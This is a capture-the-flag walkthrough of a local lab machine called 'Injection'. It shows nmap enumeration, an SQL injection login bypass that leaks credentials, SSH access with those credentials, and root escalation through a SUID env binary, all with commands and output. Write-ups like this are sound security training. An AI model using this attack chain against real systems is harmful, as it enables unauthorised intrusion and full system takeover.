# Injection

## Recognition and Enumeration.

Check that the machine is running.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once the ping responds, we can start enumerating the machine. The ttl=64 can indicate that it is a **Linux** machine.

We launch nmap to see what ports it finds.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet sending speed to 5000 per second.
- `-vvv`: Generates very detailed and verbose output.
- `-n`: Avoids reverse DNS resolution.
- `-Pn`: Skips host detection.
- `-oG allPorts`: Saves the results to a file called "allPorts".
- `172.17.0.2`: The IP address of the target host.

```bash
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 64
80/tcp open http syn-ack ttl 64
```

Since we have ports 22 and 80 open, we are going to check the version and run some basic scripts to see what information we get.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Scan for versions and vulnerabilities.
- `-p22,80`: Scan for ports 22 (SSH) and 80 (HTTP).
- `-vvv`: Very verbose and verbose output.
- `-oN versionPorts`: Save the results in "versionPorts".
- `172.17.0.2`: IP address of the scanned host.

```bash
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9UrfkzVjvriOVFwT9rOHz6XGJrVwKK/A6RMody6c0ovLNeCgaU6kCb+dGPPeXwCaio++IwxYm0SxRGYITrhr4=
| 256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJV4CYnqtqSQxWkpfq7xR8DG/nHJfLXDhtkyMHA5pLhO
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Exploit.
We go directly to enumerate port 80 from the browser and we see that there is a login form. We try a sql injection.
```bash
User: admin' OR 1 = 1 -- -
Password: hello
```
And it directly takes us to a page with a message containing the username and password.

```bash
Welcome Dylan! You have correctly entered your password: KJSDFG789FGSDF78
```
With port 22 (SSH) open, we try the username and password that they have provided us and enter the machine.
```bash
❯ ssh dylan@172.17.0.2
dylan@172.17.0.2's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.5.0-kali3-amd64 x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu May 16 16:44:37 2024 from 172.17.0.1
dylan@b5df33a8267a:~$
```
## Privilege escalation.
The first thing is to look for binaries with SUID permissions to do the escalation.
```bash
find / -perm -4000 2>/dev/null
```
```bash
dylan@b5df33a8267a:~$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
If we go to [GTOFBins](https://gtfobins.github.io/gtfobins/env/), we see that with the binary **/usr/bin/env** we can run a bash with root privileges.
```bash
/usr/bin/env /bin/sh -p
```
```bash
dylan@b5df33a8267a:~$ /usr/bin/env /bin/sh -p
# whoami
root
#
```
